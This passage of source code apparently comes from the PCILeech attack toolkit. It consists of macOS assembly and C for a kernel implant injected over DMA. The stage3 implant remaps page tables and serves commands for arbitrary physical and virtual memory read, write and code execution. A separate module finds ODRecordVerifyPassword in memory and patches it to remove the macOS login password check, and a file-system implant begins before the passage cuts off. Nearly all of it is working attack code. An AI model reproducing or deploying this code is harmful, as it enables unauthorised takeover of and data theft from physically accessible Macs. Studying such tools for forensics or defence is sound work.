	MOV rax, [r9+08h]
	POP r10
	RET 
macho_parse_find_symbol ENDP

data_str_vm_protect					db '_vm_protect', 0
data_str_IOMallocContiguous			db '_IOMallocContiguous', 0
data_str_IOCreateThread				db '_IOCreateThread', 0
data_str_kernel_map					db '_kernel_map', 0

END

```

`pcileech_shellcode/macos_stage3.asm`:

```asm
; ax64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with OS X.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS win7x64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	ENTER 20h, 0
	CALL stage3_c_EntryPoint
	LEAVE
	; ----------------------------------------------------
	; 3: RESTORE AND JMP BACK
	; ----------------------------------------------------
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; LOCATE THE __LINKEDIT END ADDRESS BY SEARCHING THE MACH-O HEADER.
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_linkedit_end_addr PROC
	MOV eax, 0FEEDFACFh			; mach_header_64 magic
	CMP eax, [rdi]
	JNE error
	MOV eax, 01000007h			; mach_header_64 cputype
	CMP eax, [rdi+4]
	JNE error

	XOR rcx, rcx
	MOV rax, 044454B4E494C5F5Fh		; __LINKED
	loop_search_linkedit:
	CMP rax, [rdi+rcx]
	JE success_search_linkedit
	ADD rcx, 4
	CMP rcx, 2000h
	JE error
	JMP loop_search_linkedit

	success_search_linkedit:
	MOV rax, [rdi+rcx+10h]
	ADD rax, [rdi+rcx+18h]
	RET

	error:
	XOR rax, rax
	RET
macho_parse_find_linkedit_end_addr ENDP

; ----------------------------------------------------
; parse mach-o header to find symtab location.
; NB! no sanity checks performed !!!
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symtab PROC
	MOV rcx, rdi
	ADD rcx, 20h
	
	loop_search_symtab:
	MOV eax, 2
	CMP [rcx], eax
	JE success_search_symtab
	MOV eax, [rcx+4]
	ADD rcx, rax
	JMP loop_search_symtab
	
	success_search_symtab:
	MOV rax, rcx
	RET
macho_parse_find_symtab ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN THE MACOS-X KERNEL IMAGE
; Function parses the MACH-O header. The symbol string section
; is located at the end of the __LINKEDIT segment. The function
; table is located just before the symbol string section at the
; end of __LINKEDIT. The size of the function table is found in
; the symtab in the mach-o header.
; destroyed registers :: rcx, r8, r9
; rcx -> rdi -> macho_header address
; rdx -> rsi -> ptr to function name
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionOSX PROC
	; ecx = counter
	; r8  = symtab_command address
	; r9  = symbol_table_current address
	; r10 = string_table_address
	PUSH r10
	PUSH rdi
	PUSH rsi
	MOV rdi, rcx
	MOV rsi, rdx

	CALL macho_parse_find_symtab
	MOV r8, rax
	CALL macho_parse_find_linkedit_end_addr
	MOV r9, rax
	MOV eax, [r8+14h]		; symtab_command->strsize
	SUB r9, rax
	MOV r10, r9

	; SET UP LOOP
	MOV ecx, [r8+0Ch]		; symtab_command->nsyms
	
	finder_loop:
	SUB r9, 10h
	MOV rax, [r9+08h]
	SHR rax, 32
	CMP eax, 0ffffff80h
	JNE finder_loop_next_or_exit

	MOV edi, [r9]
	ADD rdi, r10
	CALL strcmp_simple
	CMP rax, 0
	JE finder_loop_success

	finder_loop_next_or_exit:
	LOOP finder_loop
	XOR rax, rax
	POP rsi
	POP rdi
	POP r10
	RET

	finder_loop_success:
	MOV rax, [r9+08h]
	POP rsi
	POP rdi
	POP r10
	RET 
LookupFunctionOSX ENDP

; ----------------------------------------------------
; Lookup functions in the OSX kernel image.
; This function is called by the c-code.
; rcx = macho_header address
; rdx = ptr to FNOSX struct
; rax <- TRUE(1)/FALSE(0)
; ----------------------------------------------------
LookupFunctionsDefaultOSX PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	MOV r15, rcx				; address of macho_header
	MOV r14, rdx				; ptr to FNLX struct 
	MOV r13, 11*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_kernel_map
	PUSH rax
	LEA rax, str_PE_state
	PUSH rax
	LEA rax, str_IOFree
	PUSH rax
	LEA rax, str_IOFreeContiguous
	PUSH rax
	LEA rax, str_IOMalloc
	PUSH rax
	LEA rax, str_IOMallocContiguous
	PUSH rax
	LEA rax, str_IOSleep
	PUSH rax
	LEA rax, str_memcmp
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_memset
	PUSH rax
	LEA rax, str_vm_protect
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	POP rdx
	CALL LookupFunctionOSX
	TEST rax, rax
	JZ lookup_fail
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	POP r13
	POP r14
	POP r15
	MOV rax, 1
	RET
	lookup_fail:
	XOR rax, rax
	RET
LookupFunctionsDefaultOSX ENDP

str_kernel_map			db '_kernel_map', 0
str_PE_state			db '_PE_state', 0
str_IOFree				db '_IOFree', 0
str_IOFreeContiguous	db '_IOFreeContiguous', 0
str_IOMalloc			db '_IOMalloc', 0
str_IOMallocContiguous	db '_IOMallocContiguous', 0
str_IOSleep				db '_IOSleep', 0
str_memcmp				db '_memcmp', 0
str_memcpy				db '_memcpy', 0
str_memset				db '_memset', 0
str_vm_protect			db '_vm_protect', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of five (5)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15
	POP rsi
	POP rdi
	RET
SysVCall ENDP

PageFlush PROC
	MOV rax, cr3
	MOV cr3, rax
	RET
PageFlush ENDP

GetCR3 PROC
	MOV rax, cr3
	RET
GetCR3 ENDP

END

```

`pcileech_shellcode/macos_stage3_c.c`:

```c
// ax64_stage3_c.c : stage3 main shellcode.
// Compatible with macOS.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

//-------------------------------------------------------------------------------
// EFI related defines below.
//-------------------------------------------------------------------------------

typedef struct PE_state {
	QWORD initialized;
	QWORD video_dummy[18];
	PVOID deviceTreeHead;
	PVOID bootArgs;
} PE_state_t, *PPE_state_t;

enum {
	EfiReservedMemoryType = 0,
	EfiLoaderCode = 1,
	EfiLoaderData = 2,
	EfiBootServicesCode = 3,
	EfiBootServicesData = 4,
	EfiRuntimeServicesCode = 5,
	EfiRuntimeServicesData = 6,
	EfiConventionalMemory = 7,
	EfiUnusableMemory = 8,
	EfiACPIReclaimMemory = 9,
	EfiACPIMemoryNVS = 10,
	EfiMemoryMappedIO = 11,
	EfiMemoryMappedIOPortSpace = 12,
	EfiPalCode = 13,
	EfiMaxMemoryType = 14
};

typedef struct tdEFI_MEMORY_RANGE {
	DWORD Type;
	DWORD Pad;
	QWORD PhysicalStart;
	QWORD VirtualStart;
	QWORD NumberOfPages;
	QWORD Attribute;
} EFI_MEMORY_RANGE, *PEFI_MEMORY_RANGE;

#define BOOT_LINE_LENGTH        1024

typedef struct tdBOOT_ARGS {
	QWORD RevisionAndVersion;
	CHAR  CommandLine[BOOT_LINE_LENGTH]; // Passed in command line 
	DWORD MemoryMap; // Physical address of memory map 
	DWORD MemoryMapSize;
	DWORD MemoryMapDescriptorSize;
	DWORD MemoryMapDescriptorVersion;
	// truncated struct members exists
} BOOT_ARGS, *PBOOT_ARGS;

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern BOOL LookupFunctionsDefaultOSX(QWORD qwAddrKernelBase, QWORD qwAddrFNOSX);
extern QWORD SysVCall(QWORD fn, ...);
extern VOID PageFlush();
extern QWORD GetCR3();

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdFNMACOS { // function pointers to macOS functions (used in main control program)
	QWORD _kernel_map;
	QWORD _PE_state;
	QWORD IOFree;
	QWORD IOFreeContiguous;
	QWORD IOMalloc;
	QWORD IOMallocContiguous;
	QWORD IOSleep;
	QWORD memcmp;
	QWORD memcpy;
	QWORD memset;
	QWORD vm_protect;
	QWORD ReservedFutureUse[21];
} FNMACOS, *PFNMACOS;

#define KMDDATA_OPERATING_SYSTEM_MACOS			0x04

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNMACOS fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

#define VM_MIN_KERNEL_ADDRESS 0xFFFFFF8000000000ULL

//-------------------------------------------------------------------------------
// Kernel module functions below.
//-------------------------------------------------------------------------------

BOOL GetMemoryMap(PKMDDATA pk, PBYTE pbBuffer4k_PhysicalMemoryRange, PQWORD pcbBuffer4k_PhysicalMemoryRange)
{
	PBOOT_ARGS ba = ((PPE_state_t)pk->fn._PE_state)->bootArgs;
	PEFI_MEMORY_RANGE pEFIr;
	PPHYSICAL_MEMORY_RANGE pmr;
	QWORD cPmr = 0, o = 0;
	SysVCall(pk->fn.memset, pbBuffer4k_PhysicalMemoryRange, 0, 4096);
	pmr = (PPHYSICAL_MEMORY_RANGE)pbBuffer4k_PhysicalMemoryRange;
	while(o < ba->MemoryMapSize) {
		pEFIr = (PEFI_MEMORY_RANGE)(VM_MIN_KERNEL_ADDRESS + ba->MemoryMap + o);
		if(pEFIr->Type < EfiMaxMemoryType && pEFIr->Type != EfiReservedMemoryType && pEFIr->Type != EfiUnusableMemory && pEFIr->Type != EfiMemoryMappedIO && pEFIr->Type != EfiMemoryMappedIOPortSpace) {
			if(cPmr && (pEFIr->PhysicalStart == pmr[cPmr - 1].BaseAddress + pmr[cPmr - 1].NumberOfBytes)) {
				pmr[cPmr - 1].NumberOfBytes += pEFIr->NumberOfPages * 0x1000;
			} else {
				pmr[cPmr].BaseAddress = pEFIr->PhysicalStart;
				pmr[cPmr].NumberOfBytes = pEFIr->NumberOfPages * 0x1000;
				cPmr++;
			}
		}
		o += ba->MemoryMapDescriptorSize;
	}
	*pcbBuffer4k_PhysicalMemoryRange = cPmr * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD qwBufferOutDMA, qwBufferOutDMA_Phys;
	QWORD qwPT_PA, qwPT_VA, qwCR3;
	QWORD i, idleCount = 0;
	// 0: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_MACOS;
	if(!LookupFunctionsDefaultOSX(pk->AddrKernelBase, (QWORD)&pk->fn)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: set up mem out DMA area 4MB/16MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	qwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x01000000, 12, &qwBufferOutDMA_Phys);
	if(!qwBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		qwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x00400000, 12, &qwBufferOutDMA_Phys);
	}
	if(!qwBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000002;
		return;
	}
	if(!qwBufferOutDMA_Phys || qwBufferOutDMA_Phys > (0x100000000 - pk->DMASizeBuffer)) {
		pk->_status = 0xf0000003;
		return;
	}
	pk->DMAAddrPhysical = qwBufferOutDMA_Phys;
	pk->DMAAddrVirtual = qwBufferOutDMA;
	SysVCall(pk->fn.vm_protect, *(PQWORD)pk->fn._kernel_map, qwBufferOutDMA, pk->DMASizeBuffer, 0, 7);
	// 2: set up page tables - used to read physical memory @ 0xffffee8000000000
	qwCR3 = GetCR3();
	qwPT_VA = SysVCall(pk->fn.IOMallocContiguous, 0xA000, 12, &qwPT_PA);
	if(!qwPT_VA || (qwPT_VA & 0xfff)) {
		pk->_status = 0xf0000004;
		return;
	}
	SysVCall(pk->fn.memset, qwPT_VA, 0, 0xA000);
	for(i = 0; i < 8; i++) { // PD -> PT*8 (512*8*4k=16M)
		((PQWORD)(qwPT_VA + 0x1000))[i] = 0x0000000000000023 | (qwPT_PA + 0x1000 * (i + 2));
	}
	*(PQWORD)(qwPT_VA + 0x0000) = 0x0000000000000023 | (qwPT_PA + 0x1000); // PDPT -> PD
	*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0x0000000000000023 | qwPT_PA; // PML4 -> PDPT
	pk->ReservedKMD[0] = qwPT_VA;
	// 3: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			// thread wait after X number of idle loops - TODO: change to timing
			if(idleCount > 10000000000) {
				SysVCall(pk->fn.IOSleep, 100);
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.IOFreeContiguous, qwBufferOutDMA, 0x01000000);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0;
			SysVCall(pk->fn.IOFreeContiguous, qwPT_VA, 0xA000);
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = GetMemoryMap(pk, (PBYTE)pk->DMAAddrVirtual, &pk->_size);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))qwBufferOutDMA)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			for(i = 0; i < 512 * 8; i++) { // PT*8 -> Pages
				((PQWORD)(qwPT_VA + 0x2000))[i] = 0x8000000000000003 | ((pk->_address & 0x7ffffffffffff000) + 0x1000 * i);
			}
			PageFlush();
			if(KMD_CMD_READ == pk->_op) { // READ
				SysVCall(pk->fn.memcpy, qwBufferOutDMA, 0xffffee8000000000 + (pk->_address & 0xfff), pk->_size);
			} else { // WRITE
				SysVCall(pk->fn.memcpy, 0xffffee8000000000 + (pk->_address & 0xfff), qwBufferOutDMA, pk->_size);
			}
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, qwBufferOutDMA, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, qwBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}
```

`pcileech_shellcode/macos_unlock.c`:

```c
// macos_unlock.c : kernel code to remove the password requirement when logging on to macOS.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_unlock.c
// ml64.exe macos_common_a.asm /Femacos_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_unlock.obj macos_common.obj
// shellcode64.exe -o macos_unlock.exe "APPLE macOS UNLOCKER - REMOVE PASSWORD REQUIREMENT!              \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to unlock.                      \n         Example: '-0 1'.                                        \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) ===================%s\nSTATUS        : 0x%08X  \n=================================================================\n"
//
#include "macos_common.h"

//----------------------------------------------------------------------------------------------------------

typedef struct tdSignatureChunk {
	WORD cbOffset;
	BYTE cb;
	BYTE pb[8];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
	// in unlock mode: 
	//   chunk[0] = signature chunk 1 (required) 
	//   chunk[1] = signature chunk 2 (optional)
	//   chunk[2] = patch chunk (required)
	SIGNATURE_CHUNK chunk[3];
} SIGNATURE, *PSIGNATURE;

//----------------------------------------------------------------------------------------------------------

BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPage, PSIGNATURE pSignatures, DWORD cSignatures)
{
	BOOL result = FALSE;
	DWORD i;
	PSIGNATURE ps;
	for(i = 0; i < cSignatures; i++) {
		ps = pSignatures + i;
		if(!ps->chunk[0].cb || SysVCall(pk->fn.memcmp, pbPage + ps->chunk[0].cbOffset, ps->chunk[0].pb, (QWORD)ps->chunk[0].cb)) {
			continue;
		}
		if(ps->chunk[1].cb && SysVCall(pk->fn.memcmp, pbPage + ps->chunk[1].cbOffset, ps->chunk[1].pb, (QWORD)ps->chunk[1].cb)) {
			continue;
		}
		SysVCall(pk->fn.memcpy, pbPage + ps->chunk[2].cbOffset, ps->chunk[2].pb, (QWORD)ps->chunk[2].cb);
		result = TRUE;
	}
	return result;
}

#define NUMBER_OF_SIGNATURES 4
STATUS Unlock(PKMDDATA pk)
{
	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (El Capitan | 466064 bytes)
			{ .cbOffset = 0xfce,.cb = 6,.pb = { 0xe8, 0x69, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31 } },
			{ .cbOffset = 0xfd3,.cb = 6,.pb = { 0xeb, 0x02, 0x31, 0xdb, 0x88, 0xd8, 0x48, 0x83 } },
			{ .cbOffset = 0xfd7,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (El Capitan | 466064 bytes)
			{ .cbOffset = 0x134,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
			{ .cbOffset = 0x13c,.cb = 8,.pb = { 0x3e, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
			{ .cbOffset = 0x144,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (Sierra 10.12.3)
			{ .cbOffset = 0x130,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
			{ .cbOffset = 0x138,.cb = 8,.pb = { 0x3e, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
			{ .cbOffset = 0x140,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (Sierra 10.12.4)
			{ .cbOffset = 0x130,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
			{ .cbOffset = 0x138,.cb = 8,.pb = { 0x1a, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
			{ .cbOffset = 0x140,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
	};
	PBYTE pbMemoryMap;
	QWORD cbMemoryMap, qwBaseAddress, qwMemoryAddressMax, o;
	BOOL result = FALSE;
	// 1: Retrieve physical memory map
	pbMemoryMap = (PBYTE)SysVCall(pk->fn.IOMalloc, 4096);
	if(!pbMemoryMap) {
		return STATUS_FAIL_OUTOFMEMORY;
	}
	if(!GetMemoryMap(pk, pbMemoryMap, &cbMemoryMap)) {
		return STATUS_FAIL_MEMORYMAP_NOT_FOUND;
	}
	qwMemoryAddressMax = GetMemoryPhysicalMaxAddress(pbMemoryMap, cbMemoryMap);
	// 2: Search for the memory signature and patch it.
	for(qwBaseAddress = 0; qwBaseAddress < qwMemoryAddressMax; qwBaseAddress += 0x01000000) {
		MapMemoryPhysical(pk, qwBaseAddress);
		for(o = 0; o < 0x01000000; o += 0x1000) {
			if(IsRangeInPhysicalMap(pbMemoryMap, cbMemoryMap, qwBaseAddress + o, 0x1000)) {
				result = Unlock_FindAndPatch(pk, (PBYTE)(VM_MIN_PHYSICALMAPPING_ADDRESS + o), oSigs, NUMBER_OF_SIGNATURES) || result;
			}
		}
	}
	SysVCall(pk->fn.IOFree, pbMemoryMap, 4096);
	return result ? STATUS_SUCCESS : STATUS_FAIL_SIGNATURE_NOT_FOUND;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	if(pk->dataIn[0] == 1) {
		pk->dataOut[0] = Unlock(pk);
	} else {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
	}
}
```

`pcileech_shellcode/macos_vfs.c`:

```c
// macos_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_vfs.c
// ml64 macos_common_a.asm /Femacos_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_vfs.obj macos_common.obj
// shellcode64.exe -o macos_vfs.exe
// 

#include "macos_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

#define O_ACCMODE		0x0003
#define O_RDONLY		0x0000
#define O_WRONLY		0x0001
#define O_RDWR			0x0002

#define O_NONBLOCK		0x0004
#define O_APPEND		0x0008
#define O_SHLOCK		0x0010
#define O_EXLOCK		0x0020
#define O_ASYNC			0x0040
#define O_SYNC			0x0080
#define O_NOFOLLOW		0x0100
#define O_CREAT			0x0200
#define O_TRUNC			0x0400
#define O_EXCL			0x0800
#define O_EVTONLY		0x8000
#define O_NOCTTY		0x20000
#define O_DIRECTORY		0x100000
#define O_SYMLINK		0x200000

#define VNODE_ATTR_va_data_size		(1LL<< 4)		/* 00000010 */
#define VNODE_ATTR_va_create_time	(1LL<<12)		/* 00001000 */
#define VNODE_ATTR_va_access_time	(1LL<<13)		/* 00002000 */
#define VNODE_ATTR_va_modify_time	(1LL<<14)		/* 00004000 */
#define VNODE_ATTR_va_name			(1LL<<25)		/* 02000000 */

struct attrlist {
	WORD bitmapcount;			/* number of attr. bit sets in list (should be 5) */
	WORD reserved;			/* (to maintain 4-byte alignment) */
	DWORD commonattr;			/* common attribute group */
	DWORD volattr;			/* Volume attribute group */
	DWORD dirattr;			/* directory attribute group */
	DWORD fileattr;			/* file attribute group */
	DWORD forkattr;			/* fork attribute group */
};

typedef struct attribute_set {
	DWORD commonattr;			/* common attribute group */
	DWORD volattr;			/* Volume attribute group */
	DWORD dirattr;			/* directory attribute group */
	DWORD fileattr;			/* file attribute group */
	DWORD forkattr;			/* fork attribute group */
} attribute_set_t;


typedef struct attrreference {
	DWORD attr_dataoffset;
	DWORD attr_length;
} attrreference_t;

struct timespec {
	QWORD	tv_sec;		// seconds
